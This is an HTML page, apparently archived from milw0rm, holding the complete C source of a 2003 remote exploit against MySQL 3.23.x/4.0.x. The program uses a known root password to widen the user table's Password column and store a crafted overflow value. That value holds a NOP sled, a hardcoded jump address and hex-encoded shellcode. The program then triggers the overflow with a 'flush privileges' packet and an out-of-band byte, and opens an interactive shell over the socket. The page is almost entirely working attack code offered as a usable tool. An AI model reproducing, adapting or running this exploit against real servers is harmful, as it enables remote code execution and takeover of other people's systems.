<html><head><title>MySQL 3.23.x/4.0.x Remote Exploit</title></head><pre>/* Mysql 3.23.x/4.0.x remote exploit
* proof of concept
* using jmp *eax
* bkbll (bkbll cnhonker.net,bkbll tom.com) 2003/09/12
* compile:gcc -o mysql mysql.c -L/usr/lib/mysql -lmysqlclient
* DO NOT DISTRUBITED IT
*/
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/select.h&gt;
#include &lt;netdb.h&gt;
#include &lt;mysql/mysql.h&gt;

#define PAD 19*4*2
#define JMPADDR 0x42125b2b
#define ROOTUSER &quot;root&quot;
#define PORT 3306
#define MYDB &quot;mysql&quot;
#define ALTCOLUMSQL &quot;ALTER TABLE user CHANGE COLUMN Password Password LONGTEXT&quot;
#define LISTUSERSQL &quot;SELECT user FROM mysql.user WHERE user!='root' OR user='root LIMIT 1,1'&quot;
#define FLUSHSQL &quot;\x11\x00\x00\x00\x03\x66\x6C\x75\x73\x68\x20\x70\x72\x69\x76\x69\x6C\x65\x67\x65\x73&quot;
#define BUF 1024

MYSQL *conn;
char NOP[]=&quot;90&quot;;
/*
char shellcode[]=
&quot;31c031db31c9b002&quot;
&quot;cd8085c0751b4b31&quot;
&quot;d2b007cd8031c0b0&quot;
&quot;40cd8089c331c9b1&quot;
&quot;09b025cd80b001cd&quot;
&quot;80b017cd8031c050&quot;
&quot;405089e331c9b0a2&quot;
&quot;cd80b1e089c883e8&quot;
&quot;0af7d04089c731c0&quot;
&quot;404c89e250505257&quot;
&quot;518d4c240431dbb3&quot;
&quot;0ab066cd805983f8&quot;
&quot;017505803a497409&quot;
&quot;e2d231c04089c3cd&quot;
&quot;8089fbb103b03f49&quot;
&quot;cd8041e2f851686e&quot;
&quot;2f7368682f2f6269&quot;
&quot;89e351682d696c70&quot;
&quot;89e251525389e131&quot;
&quot;d231c0b00bcd8090&quot;;
*/
char shellcode[]=
&quot;db31c03102b0c931&quot;
&quot;c08580cd314b1b74&quot;
&quot;cd07b0d2b0c03180&quot;
&quot;8980cd40b1c931c3&quot;
&quot;cd25b009cd01b080&quot;
&quot;cd17b08050c03180&quot;
&quot;e3895040a2b0c931&quot;
&quot;e0b180cde883c889&quot;
&quot;40d0f70ac031c789&quot;
&quot;e2894c4057525050&quot;
&quot;244c8d51b3db3104&quot;
&quot;cd66b00af8835980&quot;
&quot;800575010974493a&quot;
&quot;c031d2e2cdc38940&quot;
&quot;b1fb8980493fb003&quot;
&quot;e24180cd6e6851f8&quot;
&quot;6868732f69622f2f&quot;
&quot;6851e389706c692d&quot;
&quot;5251e28931e18953&quot;
&quot;b0c031d29080cd0b&quot;;

int type=1;
struct
{
 char *os;
 u_long ret;
} targets[] =
     {
          { &quot;glibc-2.2.93-5&quot;, 0x42125b2b },
    },v;

void usage(char *);
void sqlerror(char *);
MYSQL *mysqlconn(char *server,int port,char *user,char *pass,char *dbname);

main(int argc,char **argv)
{
    MYSQL_RES *result;
    MYSQL_ROW row;
    char jmpaddress[8];
    char buffer[BUF],muser[20],buf2[800];
    my_ulonglong rslines;
    struct sockaddr_in clisocket;
    int i=0,j,clifd,count,a;
    char data1,c;
    fd_set fds;
    char *server=NULL,*rootpass=NULL;

    if(argc&lt;3) usage(argv[0]);
    while((c = getopt(argc, argv, &quot;d:t:p:&quot;))!= EOF)
      {
            switch (c)
            {
              case 'd':
                  server=optarg;
                  break;
              case 't':
                  type = atoi(optarg);
                  if((type &gt; sizeof(targets)/sizeof(v)) || (type &lt; 1))
                       usage(argv[0]);
                  break;
             case 'p':
                  rootpass=optarg;
                   break;
             default:
                  usage(argv[0]);
                  return 1;
              }
          }
          if(server==NULL || rootpass==NULL)
              usage(argv[0]);
    memset(muser,0,20);
    memset(buf2,0,800);
    printf(&quot;@-------------------------------------------------@\n&quot;);
    printf(&quot;#  Mysql 3.23.x/4.0.x remote exploit(2003/09/12)  #\n&quot;);
    printf(&quot;@ by bkbll(bkbll_at_cnhonker.net,bkbll_at_tom.com @\n&quot;);
    printf(&quot;---------------------------------------------------\n&quot;);
    printf(&quot;[+] Connecting to mysql server %s:%d....&quot;,server,PORT);
    fflush(stdout);
    conn=mysqlconn(server,PORT,ROOTUSER,rootpass,MYDB);
    if(conn==NULL) exit(0);
    printf(&quot;ok\n&quot;);
    printf(&quot;[+] ALTER user column...&quot;);
    fflush(stdout);
    if(mysql_real_query(conn,ALTCOLUMSQL,strlen(ALTCOLUMSQL))!=0)
        sqlerror(&quot;ALTER user table failed&quot;);
    //select
    printf(&quot;ok\n&quot;);
    printf(&quot;[+] Select a valid user...&quot;);
    fflush(stdout);
    if(mysql_real_query(conn,LISTUSERSQL,strlen(LISTUSERSQL))!=0) 
        sqlerror(&quot;select user from table failed&quot;);
    printf(&quot;ok\n&quot;);
    result=mysql_store_result(conn);
    if(result==NULL)
        sqlerror(&quot;store result error&quot;);
    rslines=mysql_num_rows(result);
    if(rslines==0)
        sqlerror(&quot;store result error&quot;);
    row=mysql_fetch_row(result);
    snprintf(muser,19,&quot;%s&quot;,row[0]);
    printf(&quot;[+] Found a user:%s\n&quot;,muser);
    memset(buffer,0,BUF);
    i=sprintf(buffer,&quot;update user set password='&quot;);
    sprintf(jmpaddress,&quot;%x&quot;,JMPADDR);
    jmpaddress[8]=0;
    for(j=0;j&lt;PAD-4;j+=2)
    {
        memcpy(buf2+j,NOP,2);
    }
    memcpy(buf2+j,&quot;06eb&quot;,4);
    memcpy(buf2+PAD,jmpaddress,8);
    memcpy(buf2+PAD+8,shellcode,strlen(shellcode));
    j=strlen(buf2);
    if(j%8)
    {
        j=j/8+1;
        count=j*8-strlen(buf2);
        memset(buf2+strlen(buf2),'A',count);
    }
    printf(&quot;[+] Password length:%d\n&quot;,strlen(buf2));
    memcpy(buffer+i,buf2,strlen(buf2));
    i+=strlen(buf2);
    i+=sprintf(buffer+i,&quot;' where user='%s'&quot;,muser);
    mysql_free_result(result);
    printf(&quot;[+] Modified password...&quot;);
    fflush(stdout);    
    //get result
    //write(2,buffer,i);
    if(mysql_real_query(conn,buffer,i)!=0) 
        sqlerror(&quot;Modified password error&quot;);
    //here I'll find client socket fd
    printf(&quot;ok\n&quot;);
    printf(&quot;[+] Finding client socket......&quot;);
    j=sizeof(clisocket);
    for(clifd=3;clifd&lt;256;clifd++)
    {
        if(getpeername(clifd,(struct sockaddr *)&amp;clisocket,&amp;j)==-1) continue;
        if(clisocket.sin_port==htons(PORT)) break;
    }
    if(clifd==256)
    {
        printf(&quot;FAILED\n[-] Cannot find client socket\n&quot;);
        mysql_close(conn);
        exit(0);
    }
    data1='I';
    printf(&quot;ok\n&quot;);
    printf(&quot;[+] socketfd:%d\n&quot;,clifd);
    //let server overflow
    printf(&quot;[+] Overflow server....&quot;);
    fflush(stdout);
    send(clifd,FLUSHSQL,sizeof(FLUSHSQL),0);
    //if(mysql_real_query(conn,FLUSHSQL,strlen(FLUSHSQL))!=0) 
    //    sqlerror(&quot;Flush error&quot;);
    printf(&quot;ok\n&quot;);
      printf(&quot;[+] sending OOB.......&quot;);
      fflush(stdout);
      if(send(clifd,&amp;data1,1,MSG_OOB)&lt;1)
      {
          perror(&quot;error&quot;);
          mysql_close(conn);
          exit(0);
      }
    printf(&quot;ok\r\n&quot;);
    printf(&quot;[+] Waiting a shell.....&quot;);
    fflush(stdout);
    j=0;
    memset(buffer,0,BUF);
      while(1)
    {
        FD_ZERO(&amp;fds);
        FD_SET(0, &amp;fds);
        FD_SET(clifd, &amp;fds);
        
        if (select(clifd+1, &amp;fds, NULL, NULL, NULL) &lt; 0) 
        {
            if (errno == EINTR) continue;
            break;
        }
        if (FD_ISSET(0, &amp;fds)) 
        {
            count = read(0, buffer, BUF);
            if (count &lt;= 0) break;
            if (write(clifd, buffer, count) &lt;= 0) break;
            memset(buffer,0,BUF);
        }
        if (FD_ISSET(clifd, &amp;fds)) 
        {
            count = read(clifd, buffer, BUF);
            if (count &lt;= 0) break;
            if(j==0) printf(&quot;Ok\n&quot;);
            j=1;
            if (write(1, buffer, count) &lt;= 0) break;
            memset(buffer,0,BUF);
        }
        
    }    
}

void usage(char *s)
{
    int a;
    printf(&quot;@-------------------------------------------------@\n&quot;);
    printf(&quot;#  Mysql 3.23.x/4.0.x remote exploit(2003/09/12)  #\n&quot;);
    printf(&quot;@ by bkbll(bkbll_at_cnhonker.net,bkbll_at_tom.com @\n&quot;);
    printf(&quot;---------------------------------------------------\n&quot;);
    printf(&quot;Usage:%s -d &lt;host&gt; -p &lt;root_pass&gt; -t &lt;type&gt;\n&quot;,s);
    printf(&quot;      -d target host ip/name\n&quot;);
    printf(&quot;      -p 'root' user paasword\n&quot;);
    printf(&quot;      -t  type [default:%d]\n&quot;,type);
    printf(&quot;      ------------------------------\n&quot;);
    for(a = 0; a &lt; sizeof(targets)/sizeof(v); a++)
        printf(&quot;         %d [0x%.8x]: %s\n&quot;, a+1, targets[a].ret, targets[a].os);   
    printf(&quot;\n&quot;);           
    exit(0);
}
MYSQL *mysqlconn(char *server,int port,char *user,char *pass,char *dbname)
{
    MYSQL *connect;
    connect=mysql_init(NULL);
    if(connect==NULL)
    {
        printf(&quot;FAILED\n[-] init mysql failed:%s\n&quot;,mysql_error(connect));
        return NULL;
    }
    if(mysql_real_connect(connect,server,user,pass,dbname,port,NULL,0)==NULL)
    {
           printf(&quot;FAILED\n[-] Error: %s\n&quot;,mysql_error(connect));
           return NULL;
       }
       return connect;

}
void sqlerror(char *s)
{
    fprintf(stderr,&quot;FAILED\n[-] %s:%s\n&quot;,s,mysql_error(conn));
    mysql_close(conn);
    exit(0);
}

// milw0rm.com [2003-09-14]</pre></html>